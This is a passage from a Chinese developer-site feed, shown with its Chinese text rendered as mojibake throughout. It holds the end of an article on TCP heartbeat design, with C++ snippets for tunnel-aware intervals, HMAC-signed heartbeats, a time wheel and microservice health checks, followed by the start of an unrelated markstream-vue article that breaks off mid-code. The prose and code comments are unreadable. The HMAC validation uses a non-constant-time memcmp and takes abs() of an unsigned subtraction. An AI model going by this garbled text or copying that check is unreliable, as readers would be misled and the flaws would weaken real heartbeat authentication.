<p><strong>æˆ‘</strong>ï¼šâ€œæ‰€ä»¥éœ€è¦â€˜é€€é¿ç­–ç•¥â€™ã€‚è¿›å…¥éš§é“æ—¶å¿«é€Ÿæ£€æµ‹å¤±è´¥ï¼Œç„¶åè¿›å…¥æŒ‡æ•°é€€é¿ï¼Œé¿å…æ— æ•ˆå°è¯•ã€‚â€</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TunnelAwareHeartbeat</span> {
    <span class="hljs-keyword">enum class</span> <span class="hljs-title class_">NetworkState</span> {
        NORMAL,
        ENTERING_TUNNEL,   <span class="hljs-comment">// ä¿¡å·å‡å¼±</span>
        IN_TUNNEL,         <span class="hljs-comment">// æ— ä¿¡å·</span>
        EXITING_TUNNEL     <span class="hljs-comment">// ä¿¡å·æ¢å¤</span>
    };
    
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">adjust_for_tunnel</span><span class="hljs-params">(NetworkState state)</span> </span>{
        <span class="hljs-keyword">switch</span> (state) {
            <span class="hljs-keyword">case</span> NetworkState::ENTERING_TUNNEL:
                interval_ = <span class="hljs-number">10</span>;  <span class="hljs-comment">// å¿«é€Ÿæ£€æµ‹æ˜¯å¦çœŸè¿›å…¥éš§é“</span>
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NetworkState::IN_TUNNEL:
                interval_ = <span class="hljs-number">300</span>; <span class="hljs-comment">// éš§é“å†…ï¼Œ5åˆ†é’Ÿä¸€æ¬¡</span>
                max_retries_ = <span class="hljs-number">1</span>; <span class="hljs-comment">// å‡å°‘é‡è¯•</span>
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NetworkState::EXITING_TUNNEL:
                interval_ = <span class="hljs-number">5</span>;   <span class="hljs-comment">// å¿«é€Ÿæ¢æµ‹ç½‘ç»œæ¢å¤</span>
                aggressive_mode_ = <span class="hljs-literal">true</span>;
                <span class="hljs-keyword">break</span>;
        }
    }
};
</code></pre>
<hr/>
<h2 data-id="heading-11">ç¬¬äº”é—®ï¼šå¿ƒè·³æœºåˆ¶çš„å®‰å…¨è€ƒè™‘æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<h3 data-id="heading-12">å®‰å…¨å›¢é˜Ÿè´¨è¯¢ï¼š</h3>
<p><strong>å®‰å…¨å·¥ç¨‹å¸ˆ</strong>ï¼šâ€œä½ ä»¬çš„å¿ƒè·³åè®®å¯èƒ½è¢«DDoSæ”»å‡»åˆ©ç”¨ã€‚æ”»å‡»è€…å¯ä»¥å»ºç«‹å¤§é‡è¿æ¥ï¼Œåªå‘å¿ƒè·³åŒ…æ¶ˆè€—æœåŠ¡å™¨èµ„æºã€‚â€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œæˆ‘ä»¬æœ‰å‡ ä¸ªé˜²æŠ¤æªæ–½ã€‚é¦–å…ˆï¼Œå¿ƒè·³åè®®è¦éªŒè¯...â€</p>
<p><strong>å®‰å…¨å·¥ç¨‹å¸ˆ</strong>ï¼šâ€œéªŒè¯ä»€ä¹ˆï¼Ÿå¿ƒè·³åŒ…é‚£ä¹ˆå°ï¼Œèƒ½éªŒè¯ä»€ä¹ˆï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œå³ä½¿æ˜¯å¿ƒè·³åŒ…ï¼Œä¹Ÿå¯ä»¥å¸¦ç­¾åã€‚æ¯”å¦‚æ—¶é—´æˆ³+åºåˆ—å·çš„HMACç­¾åã€‚â€</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SecureHeartbeat</span> {
    <span class="hljs-type">uint32_t</span> timestamp;
    <span class="hljs-type">uint32_t</span> sequence;
    <span class="hljs-type">uint8_t</span>  hmac_signature[<span class="hljs-number">32</span>];  <span class="hljs-comment">// HMAC-SHA256</span>
    
    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">validate</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* secret_key, <span class="hljs-type">size_t</span> key_len)</span> </span>{
        <span class="hljs-comment">// æ£€æŸ¥æ—¶é—´æˆ³ï¼ˆé˜²æ­¢é‡æ”¾æ”»å‡»ï¼‰</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">get_current_time</span>() - timestamp) &gt; <span class="hljs-number">30</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æ—¶é—´åå·®å¤ªå¤§</span>
        }
        
        <span class="hljs-comment">// éªŒè¯HMACç­¾å</span>
        <span class="hljs-type">uint8_t</span> computed_hmac[<span class="hljs-number">32</span>];
        <span class="hljs-built_in">compute_hmac</span>(secret_key, key_len, 
                    <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">uint8_t</span>*&gt;(<span class="hljs-keyword">this</span>), 
                    <span class="hljs-built_in">sizeof</span>(SecureHeartbeat) - <span class="hljs-number">32</span>,
                    computed_hmac);
        
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">memcmp</span>(hmac_signature, computed_hmac, <span class="hljs-number">32</span>) == <span class="hljs-number">0</span>;
    }
};
</code></pre>
<p><strong>å®‰å…¨å·¥ç¨‹å¸ˆ</strong>ï¼šâ€œé‚£åºåˆ—å·é‡å¤æ”»å‡»å‘¢ï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œæœåŠ¡ç«¯ä¼šè®°å½•æœ€è¿‘æ”¶åˆ°çš„åºåˆ—å·ï¼Œæ‹’ç»é‡å¤æˆ–ä¹±åºçš„åŒ…ã€‚â€</p>
<hr/>
<h2 data-id="heading-13">ç¬¬å…­é—®ï¼šå¦‚ä½•å¹³è¡¡å¿ƒè·³çš„åŠæ—¶æ€§å’Œç³»ç»Ÿå¼€é”€ï¼Ÿ</h2>
<h3 data-id="heading-14">æ€§èƒ½ä¼˜åŒ–è®¨è®ºï¼š</h3>
<p><strong>æ€§èƒ½å›¢é˜Ÿ</strong>ï¼šâ€œå¿ƒè·³æ£€æµ‹çº¿ç¨‹å ç”¨äº†5%çš„CPUï¼Œè¿æ¥æ•°ä¸Šæ¶¨åå¯èƒ½æˆä¸ºç“¶é¢ˆã€‚â€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œæˆ‘ä»¬æ­£åœ¨ä»çº¿æ€§æ‰«ææ”¹ä¸ºæ—¶é—´è½®ç®—æ³•ã€‚åä¸‡è¿æ¥æ£€æµ‹ä»O(n)é™åˆ°O(1)ã€‚â€</p>
<p><strong>æ€§èƒ½å›¢é˜Ÿ</strong>ï¼šâ€œæ—¶é—´è½®ï¼Ÿå…·ä½“è¯´è¯´ã€‚â€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œæŠŠæ—¶é—´åˆ†æˆæ§½ï¼Œæ¯ä¸ªæ§½å­˜æ”¾è¿™ä¸ªæ—¶é—´ç‚¹éœ€è¦æ£€æŸ¥çš„è¿æ¥ã€‚æŒ‡é’ˆæ¯è·³ä¸€æ ¼ï¼Œåªæ£€æŸ¥å½“å‰æ§½ä½çš„è¿æ¥ã€‚â€</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ—¶é—´è½®å®ç°ç¤ºä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeWheelHeartbeat</span> {
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Slot</span> {
        std::vector&lt;<span class="hljs-type">int</span>&gt; connections;
        std::chrono::steady_clock::time_point expected_time;
    };
    
    std::vector&lt;Slot&gt; wheel_;
    <span class="hljs-type">size_t</span> current_slot_;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">tick</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">auto</span>&amp; slot = wheel_[current_slot_];
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> conn_id : slot.connections) {
            <span class="hljs-built_in">check_connection</span>(conn_id);  <span class="hljs-comment">// åªæ£€æŸ¥å½“å‰æ§½ä½çš„è¿æ¥</span>
        }
        slot.connections.<span class="hljs-built_in">clear</span>();
        current_slot_ = (current_slot_ + <span class="hljs-number">1</span>) % wheel_.<span class="hljs-built_in">size</span>();
    }
    
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_connection</span><span class="hljs-params">(<span class="hljs-type">int</span> conn_id, <span class="hljs-type">int</span> timeout_sec)</span> </span>{
        <span class="hljs-type">size_t</span> target_slot = (current_slot_ + timeout_sec) % wheel_.<span class="hljs-built_in">size</span>();
        wheel_[target_slot].connections.<span class="hljs-built_in">push_back</span>(conn_id);
    }
};
</code></pre>
<p><strong>æ€§èƒ½å›¢é˜Ÿ</strong>ï¼šâ€œé‚£å†…å­˜å ç”¨å‘¢ï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œæ¯ä¸ªè¿æ¥åªåœ¨æ—¶é—´è½®é‡Œå­˜ä¸€ä¸ªIDï¼ŒO(n)å†…å­˜ã€‚æ£€æµ‹æ—¶O(1)æ—¶é—´å¤æ‚åº¦ã€‚â€</p>
<hr/>
<h2 data-id="heading-15">ç¬¬ä¸ƒé—®ï¼šåœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œå¿ƒè·³æœºåˆ¶å¦‚ä½•è®¾è®¡ï¼Ÿ</h2>
<h3 data-id="heading-16">æ¶æ„è®¨è®ºä¼šï¼š</h3>
<p><strong>å¾®æœåŠ¡æ¶æ„å¸ˆ</strong>ï¼šâ€œç°åœ¨æˆ‘ä»¬æœåŠ¡æ‹†å¾—å¾ˆç»†ï¼ŒæœåŠ¡ç½‘æ ¼é‡Œæ¯ä¸ªPodéƒ½æœ‰å¿ƒè·³ï¼Œæ˜¯ä¸æ˜¯å¤ªå¤šäº†ï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œç¡®å®éœ€è¦åˆ†å±‚è®¾è®¡ã€‚æˆ‘å»ºè®®ä¸‰çº§å¿ƒè·³ä½“ç³»...â€</p>
<p><strong>æ¶æ„å¸ˆ</strong>ï¼šâ€œä¸‰çº§ï¼Ÿå“ªä¸‰çº§ï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œç¬¬ä¸€çº§ï¼šTCPå±‚Keepaliveï¼Œç³»ç»Ÿçº§ä¿åº•ã€‚ç¬¬äºŒçº§ï¼šåº”ç”¨å±‚åŸºç¡€å¿ƒè·³ï¼ŒæœåŠ¡é—´ä¿æ´»ã€‚ç¬¬ä¸‰çº§ï¼šä¸šåŠ¡çº§å¥åº·æ£€æŸ¥ï¼Œå¸¦è´Ÿè½½å’ŒçŠ¶æ€ä¿¡æ¯ã€‚â€</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// å¾®æœåŠ¡å¿ƒè·³ä½“ç³»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MicroserviceHeartbeatSystem</span> {
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Level1</span> {
        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">enable_tcp_keepalive</span><span class="hljs-params">(Connection&amp; conn)</span> </span>{
            conn.<span class="hljs-built_in">set_option</span>(TCP_KEEPALIVE, <span class="hljs-literal">true</span>);
            conn.<span class="hljs-built_in">set_option</span>(TCP_KEEPIDLE, <span class="hljs-number">60</span>);
        }
    };
    
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Level2</span> {
        <span class="hljs-comment">// åº”ç”¨å±‚å¿ƒè·³ï¼Œæºå¸¦æœåŠ¡æ ‡è¯†</span>
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">AppHeartbeat</span> {
            ServiceId service_id;
            InstanceId instance_id;
            Timestamp timestamp;
        };
        
        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">send_to_service_mesh</span><span class="hljs-params">()</span> </span>{
            <span class="hljs-comment">// é€šè¿‡æœåŠ¡ç½‘æ ¼å‘é€</span>
        }
    };
    
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Level3</span> {
        <span class="hljs-comment">// ä¸šåŠ¡å¥åº·æ£€æŸ¥</span>
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">HealthCheck</span> {
            CPUUsage cpu_usage;
            MemoryUsage memory;
            QueueLength request_queue;
            CustomMetrics business_metrics;
        };
        
        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">report_to_monitoring</span><span class="hljs-params">()</span> </span>{
            <span class="hljs-comment">// ä¸ŠæŠ¥åˆ°ç›‘æ§ç³»ç»Ÿ</span>
        }
    };
};
</code></pre>
<hr/>
<h2 data-id="heading-17">ç»“è¯­ï¼šå¿ƒè·³çš„è‰ºæœ¯</h2>
<p><strong>æˆ‘</strong>ï¼šï¼ˆæ€»ç»“ä¼šè®®ï¼‰â€œæ‰€ä»¥ï¼Œå¿ƒè·³æœºåˆ¶ä¸æ˜¯ç®€å•çš„å®šæ—¶å‘é€ã€‚å®ƒæ˜¯...â€</p>
<p><strong>å›¢é˜Ÿ</strong>ï¼šï¼ˆå¼‚å£åŒå£°ï¼‰â€œè¿æ¥çš„ç”Ÿå‘½çº¿ã€ç³»ç»Ÿçš„å¬è¯Šå™¨ã€ç½‘ç»œçš„æ¢ç…§ç¯ï¼â€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œæ²¡é”™ï¼åœ¨è®¾è®¡å¿ƒè·³æœºåˆ¶æ—¶ï¼Œæˆ‘ä»¬è¦é—®è‡ªå·±å…«ä¸ªé—®é¢˜...â€</p>
<h3 data-id="heading-18">è®¾è®¡æ£€æŸ¥è¡¨ï¼š</h3>
<ol>
<li>â“ å¿ƒè·³é—´éš”èƒ½å¦åº”å¯¹æœ€å·®ç½‘ç»œç¯å¢ƒï¼Ÿ</li>
<li>â“ NATè¶…æ—¶æ—¶é—´è€ƒè™‘äº†å—ï¼Ÿ</li>
<li>â“ å¿ƒè·³æµé‡å æ€»æµé‡æ¯”ä¾‹åˆç†å—ï¼Ÿ</li>
<li>â“ æ–­çº¿æ£€æµ‹å»¶è¿Ÿä¸šåŠ¡èƒ½æ¥å—å—ï¼Ÿ</li>
<li>â“ å¿ƒè·³å¤±è´¥åçš„é‡è¿ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>â“ å¿ƒè·³åè®®èƒ½å¦é˜²æ­¢æ¶æ„æ”»å‡»ï¼Ÿ</li>
<li>â“ å¿ƒè·³æœºåˆ¶æœ¬èº«çš„é«˜å¯ç”¨å¦‚ä½•ä¿è¯ï¼Ÿ</li>
<li>â“ æœ‰æ²¡æœ‰ç›‘æ§å’ŒåŠ¨æ€è°ƒæ•´èƒ½åŠ›ï¼Ÿ</li>
</ol>
<hr/>
<p><strong>åè®°</strong>ï¼š
ä¸‰ä¸ªæœˆåï¼Œé‚£ä¸ªæ·±å¤œå‘Šè­¦çš„é—®é¢˜ç»ˆäºæ‰¾åˆ°äº†æ ¹æœ¬åŸå› ã€‚ä¸æ˜¯ä»£ç bugï¼Œä¸æ˜¯ç¡¬ä»¶æ•…éšœï¼Œè€Œæ˜¯å¿ƒè·³æœºåˆ¶ä¸NATè¶…æ—¶æ—¶é—´çš„ä¸åŒ¹é…ã€‚æˆ‘ä»¬å°†å¿ƒè·³é—´éš”ä»60ç§’è°ƒæ•´åˆ°45ç§’åï¼Œå†ä¹Ÿæ²¡æœ‰å‘ç”Ÿè¿‡å¤§è§„æ¨¡æ‰çº¿ã€‚</p>
<p>æœ‰æ—¶å€™ï¼ŒæŠ€æœ¯ä¸­æœ€ä¸èµ·çœ¼çš„ç»†èŠ‚ï¼Œæ°æ°æ˜¯æœ€å…³é”®çš„ç”Ÿå‘½çº¿ã€‚TCPå¿ƒè·³æœºåˆ¶ï¼Œå°±æ˜¯è¿™æ ·ä¸€æ¡çœ‹ä¸è§çš„ã€å´è‡³å…³é‡è¦çš„â€œç”Ÿå‘½çº¿â€ã€‚</p>
<p><strong>è®°ä½</strong>ï¼šåœ¨ç½‘ç»œçš„ä¸–ç•Œé‡Œï¼Œæ²‰é»˜ä¸ä¸€å®šæ˜¯é‡‘â€”â€”å®ƒå¯èƒ½æ„å‘³ç€è¿æ¥å·²ç»æ‚„ç„¶æ­»äº¡ã€‚è€Œä¸€ä¸ªå¥½çš„å¿ƒè·³æœºåˆ¶ï¼Œå°±æ˜¯è®©æ²‰é»˜â€œè¯´è¯â€çš„è‰ºæœ¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[markstream-vueå®æˆ˜è¸©å‘ç¬”è®°]]></title>    <link>https://juejin.cn/post/7595043440520151046</link>    <guid>https://juejin.cn/post/7595043440520151046</guid>    <pubDate>2026-01-14T14:21:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595043440520151046" data-draft-id="7594791357144563754" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="markstream-vueå®æˆ˜è¸©å‘ç¬”è®°"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-14T14:21:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¡œå¹é›ª"/> <meta itemprop="url" content="https://juejin.cn/user/1179091901098269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            markstream-vueå®æˆ˜è¸©å‘ç¬”è®°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1179091901098269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¡œå¹é›ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:21:55.000Z" title="Wed Jan 14 2026 14:21:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘æ–°å¼€å§‹åšäº†ä¸€ä¸ªaiå¯¹è¯çš„é¡¹ç›®ï¼Œæ‰“ç®—é‡æ„ä¸€ä¸‹è€é¡¹ç›®çš„markdownæ¸²æŸ“å’Œäº¤äº’ã€‚è€é¡¹ç›®ä½¿ç”¨markedå¯¹mdè¿›è¡Œæ¸²æŸ“æˆhtmlï¼Œç„¶åä½¿ç”¨v-htmlæ¸²æŸ“ï¼Œæåˆ°åé¢å‘ç°å¤ªå¤šæŠ€æœ¯å€ºäº†ï¼Œæ‰€ä»¥æ‰“ç®—æ¢ä¸€ä¸ªå®ç°æ–¹æ³•ã€‚ç»è¿‡ä¸€ç•ªå¯¹æ¯”ï¼Œå‘ç° <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSimon-He95%2Fmarkstream-vue" target="_blank" title="https://github.com/Simon-He95/markstream-vue" ref="nofollow noopener noreferrer">markstream-vue</a> çš„staræ˜¯æœ€å¤šçš„ï¼Œå»çœ‹äº†ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£å‘ç°ç‰¹æ€§ä¹Ÿå¾ˆå¤šã€‚æ‰€ä»¥è¿™é‡Œå†³å®šå°±ç”¨è¿™ä¸ªç»„ä»¶äº†ã€‚</p>
<h2 data-id="heading-0">éœ€æ±‚è¯´æ˜</h2>
<p>è¿™é‡Œå®ç°çš„ä¸€ä¸ªé¡¹ç›®æ˜¯aiå¯¹è¯çš„åº”ç”¨ï¼Œç‰¹ç‚¹æ˜¯å¯èƒ½markdowné‡Œè¦æ··ç€å„ç§ä¸šåŠ¡ç»„ä»¶ï¼Œä»¥åŠä¸€äº›mdçš„èŠ‚ç‚¹å¯ä»¥ç‚¹å‡»äº¤äº’ï¼Œæ¯”å¦‚åˆ—è¡¨é¡¹æˆ–è€…é“¾æ¥ç‚¹å‡»ä»£æ›¿ç”¨æˆ·è‡ªåŠ¨å‘é€ä¿¡æ¯ã€‚</p>
<h2 data-id="heading-1">å®‰è£…ä½¿ç”¨</h2>
<p>å®‰è£…å°±ä¸å¤šæµªè´¹å£æ°´äº†ï¼Œå®˜æ–¹æ–‡æ¡£å†™çš„éå¸¸è¯¦ç»†ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹æ¡ˆä¾‹markdownï¼Œä»¥åŠä½¿ç”¨åº“æä¾›çš„markdownè§£ææˆèŠ‚ç‚¹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { getMarkdown, <span class="hljs-title class_">MarkdownRender</span>, parseMarkdownToStructure } <span class="hljs-keyword">from</span> <span class="hljs-string">'markstream-vue'</span>

<span class="hljs-keyword">const</span> md = <span class="hljs-string">`
&lt;thinking&gt;
è¿™æ˜¯æ¨ç†å†…å®¹
&lt;/thinking&gt;

è¯·é€‰æ‹©åŠç†æ–¹å¼
- çº¿ä¸ŠåŠç†
- çº¿ä¸‹åŠç†

&lt;a data-send="å…¶ä»–åŠç†æ–¹å¼"&gt;å…¶ä»–åŠç†æ–¹å¼&lt;/a&gt;
`</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-title function_">parseMarkdownToStructure</span>(md, <span class="hljs-title function_">getMarkdown</span>()), <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>))
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7be94536002148d8b70d6a9bfcd61d2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qGc5ZC56Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769005314&amp;x-signature=kNOqj2NP6wudRlYphQsRa4cL4x4%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">å¯¹list_itemå’Œlinkè¿›è¡Œè‡ªå®šä¹‰</h3>
<p>å¦‚æœåªæ˜¯æ¸²æŸ“ä¸Šé¢çš„mdï¼Œå¾ˆç®€å•ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">MarkdownRender</span> <span class="hljs-attr">:content</span>=<span class="hljs-string">"md"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>ä½†æ˜¯æˆ‘éœ€è¦å®ç°å¯¹list_itemå’Œlinkè¿›è¡Œè‡ªå®šä¹‰æ¸²æŸ“ï¼Œé‚£å°±éœ€è¦ä½¿ç”¨åˆ° <code>setCustomComponents</code> ä»¥åŠå¯¹rendererè®¾ç½®custom-id</p>
<p>å‚è€ƒå®˜æ–¹çš„æ€è€ƒblockæ¸²æŸ“ç»„ä»¶ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSimon-He95%2Fmarkstream-vue%2Fblob%2Fmain%2Fplayground%2Fsrc%2Fcomponents%2FThinkingNode.vue" target="_blank" title="https://github.com/Simon-He95/markstream-vue/blob/main/playground/src/components/ThinkingNode.vue" ref="nofollow noopener noreferrer">github.com/Simon-He95/â€¦</a></p>
<p>æˆ‘ä»¬å…ˆè¯•è¯•thinkingçš„æ¸²æŸ“ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">MarkdownRender</span>, setCustomComponents } <span class="hljs-keyword">from</span> <span class="hljs-string">'markstream-vue'</span>
